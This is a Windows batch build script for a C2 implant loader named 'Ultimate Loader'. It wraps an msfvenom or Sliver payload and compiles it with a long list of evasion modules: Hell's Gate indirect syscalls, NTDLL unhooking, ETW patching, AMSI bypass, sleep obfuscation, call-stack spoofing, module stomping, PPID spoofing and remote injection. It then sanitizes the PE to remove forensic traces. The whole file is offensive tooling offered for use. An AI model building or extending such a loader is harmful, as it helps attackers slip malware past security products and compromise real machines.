@echo off
REM =====================================================
REM  Ultimate Loader - Build Script (MinGW/GCC)
REM  Requires: payload_raw.bin in this directory
REM =====================================================

if not exist build mkdir build

if not exist payload_raw.bin (
    echo [!] payload_raw.bin not found. Generate it from Sliver/msfvenom first.
    exit /b 1
)

echo [*] Building tools...
gcc -O2 tools\bin2header.c -o build\bin2header.exe
if %errorlevel% neq 0 ( echo [!] Failed & exit /b 1 )
gcc -O2 tools\pe_sanitize.c -o build\pe_sanitize.exe
if %errorlevel% neq 0 ( echo [!] Failed & exit /b 1 )

echo [*] Embedding and encrypting payload (with entropy reduction)...
build\bin2header.exe payload_raw.bin %1
if %errorlevel% neq 0 ( echo [!] Failed & exit /b 1 )

echo [*] Assembling syscall stub...
gcc -c asm\syscalls.x64.s -o build\syscalls.o
if %errorlevel% neq 0 ( echo [!] Failed & exit /b 1 )

echo [*] Compiling Ultimate Loader...
gcc -O2 -s -w -fno-ident -fno-asynchronous-unwind-tables ^
    src\standalone.c ^
    src\winapi.c ^
    src\hellsgate.c ^
    src\api_hash.c ^
    src\crypto.c ^
    src\ntdll_unhook.c ^
    src\env_keying.c ^
    src\telemetry.c ^
    src\sleep_obf.c ^
    src\stackspoof.c ^
    src\module_stomp.c ^
    src\inject_remote.c ^
    src\ppid_spoof.c ^
    build\syscalls.o ^
    -o build\implant.exe ^
    -lntdll -ladvapi32 -mwindows
if %errorlevel% neq 0 ( echo [!] Compilation failed & exit /b 1 )

echo [*] Sanitizing PE (removing forensic artifacts)...
build\pe_sanitize.exe build\implant.exe
if %errorlevel% neq 0 ( echo [!] PE sanitization failed & exit /b 1 )

echo.
echo [+] ============================================
echo [+]  Ultimate Loader built: build\implant.exe
echo [+] ============================================
echo [+]  Features:
echo [+]    - Dynamic API resolution (clean IAT)
echo [+]    - String obfuscation (XOR runtime decrypt)
echo [+]    - Environmental keying
echo [+]    - Anti-sandbox / Anti-debug
echo [+]    - ETW patching
echo [+]    - AMSI bypass
echo [+]    - NTDLL unhook (KnownDlls)
echo [+]    - Indirect syscalls (Hell's Gate)
echo [+]    - PE header stomping
echo [+]    - Sleep obfuscation (Ekko via syscalls)
echo [+]    - Call stack spoofing
echo [+]    - Module stomping injection
echo [+]    - Payload encryption + entropy reduction
echo [+]    - PE sanitization (no timestamp/rich/debug)
echo [+] ============================================
echo.
echo Usage: just run build\implant.exe - no arguments needed.
